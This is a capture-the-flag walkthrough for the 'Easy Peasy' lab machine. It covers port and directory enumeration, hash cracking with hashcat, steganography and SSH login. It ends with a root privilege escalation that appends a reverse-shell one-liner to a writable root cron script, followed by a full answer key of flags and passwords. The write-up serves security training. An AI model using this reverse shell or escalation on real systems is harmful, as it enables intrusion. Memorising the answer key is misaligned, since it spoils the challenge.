# Easy Peasy - Easy

```shell
nmap -T4 -A 10.10.98.43

gobuster dir -u http://10.10.98.43 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

gobuster dir -u http://10.10.98.43:65524 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

gobuster dir -u http://10.10.98.43/hidden -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

hashcat -a 0 hashes.txt easypeasy.txt
#to crack the hash
#hashcat gives us some suggestions for the type of hash, we can use that

#trying different modes to crack the hash
hashcat -a 0 -m 1400 hashes.txt easypeasy.txt
#trying for SHA2-256

hashcat -a 0 -m 17400 hashes.txt easypeasy.txt
#trying SHA3-256

hashcat -a 0 -m 11700 hashes.txt easypeasy.txt
#trying GOST big-endian

hashcat -a 0 -m 6900 hashes.txt easypeasy.txt
#trying GOST
#this works and we crack the hash

#for the third flag, we can follow a similar procedure
#or we can use online cracking services
#such as Crackstation and md5hashing

#checking stego tricks on binarycode pic
steghide extract -sf binarycodepixabay.jpg
#using the password 'mypasswordforthatjob', we can extract data

cat secrettext.txt
#convert binary to ascii
#now we have creds for ssh

ssh boring@10.10.98.43 -p 6498

ls -la

cat user.txt
#user flag to be rotated

cat /etc/crontab
#check cronjobs
#shows the script running every minute by root

ls -la /var/www/.mysecretcronjob.sh
#we can read and write to this

cat /var/www/.mysecretcronjob.sh

echo "sh -i >& /dev/tcp/10.14.31.212/5555 0>&1" >> /var/www/.mysecretcronjob.sh

#setup listener on attacker machine
nc -nvlp 5555
#we get root shell here in a minute

cd /root

ls -la
#root flag in .root.txt
```

```markdown
The nmap scan gives us the following ports & services:

  * 80 - http - nginx/1.16.1
  * 6498 - ssh - openssh 7.6p1 (Ubuntu)
  * 65524 - http - apache/2.4.43

After this, we can check both websites on port 80 and 65524, and run Gobuster on both to look for interesting directories.

Website on port 80 has following directories:

  * /index.html
  * /hidden
  * /robots.txt - contains note 'Robots Not Allowed'

Website on port 65524 has following directories:

  * /index.html - contains comment 'ObsJmP173N2X6dOrAgEAL0Vu'
  * /robots.txt - contains User-Agent:a18672860d0510e5ab6699730763b250

/hidden on port 80 has these directories:

  * /index.html
  * /whatever

Further, we can try looking into the image found on /hidden for any clues using steganography; but we do not get anything.

In the comments on /whatever, we get the clue in form of a base64 encoded string, which when decoded gives us the first flag.

In the comments on /index.html on port 65524, we get a clue in the comment; and the comment hints towards encoding in base-something.

Using CyberChef, we decode 'ObsJmP173N2X6dOrAgEAL0Vu' from base62 to get a directory '/n0th1ng3ls3m4tt3r'.

Using Burp Suite, if we replace browser's User-Agent by the given string in the website on port 65524 (robots.txt), we get our third flag - flag{9fdafbd64c47471a8f54cd3fc64cd312}.

/n0th1ng3ls3m4tt3r on port 65524 leads us to a cryptic webpage; we can run Gobuster to enumerate directories, but we do not get anything.

The same directory also contains a clue '940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81', which seems like a SHA256 hash.

Now we have been given easypeasy.txt in the task files; we have to use that to crack this hash.

Using Hashcat for GOST (-m 6900), we get the password 'mypasswordforthatjob'.

For further enumeration, we can also conduct stego on the image found in /n0th1ng3ls3m4tt3r.

Using steghide and the password we found earlier from the same webpage, we get a text file with username 'boring' and binary data; the binary data when converted to ascii gives 'iconvertedmypasswordtobinary'.

Now, with all the web flags found, we can log into SSH using the creds boring:iconvertedmypasswordtobinary, we need to use port 6498.

From user.txt, we get the rotated string - synt{a0jvgf33zfa0ez4y}; this can be decoded with ROT-13.

We need to enumerate the machine for privesc.

Looking at the cronjobs, we can see that there is a script which runs every minute; also, the script is readable and writable by us.

Now this script is run by root in crontab, so we can add a reverse-shell one-liner in the script and setup a listener.

We modify the script accordingly, and in a minute, we get a root shell on our listener.

Root flag can be found at /root/.root.txt
```

1. How many ports are open? - 3

2. What is the version of nginx? - 1.16.1

3. What is running on the highest port? - Apache

4. Using Gobuster, find flag 1. - flag{f1rs7_fl4g}

5. Further enumerate the machine, what is flag 2? - flag{1m_s3c0nd_fl4g}

6. Crack the hash with easypeasy.txt, what is flag 3? - flag{9fdafbd64c47471a8f54cd3fc64cd312}

7. What is the hidden directory? - /n0th1ng3ls3m4tt3r

8. Using the wordlist provided in this task, crack the hash. What is the password? - mypasswordforthatjob

9. What is the password to login to the machine via SSH? - iconvertedmypasswordtobinary

10. What is the user flag? - flag{n0wits33msn0rm4l}

11. What is the root flag? - flag{63a9f0ea7bb98050796b649e85481845}
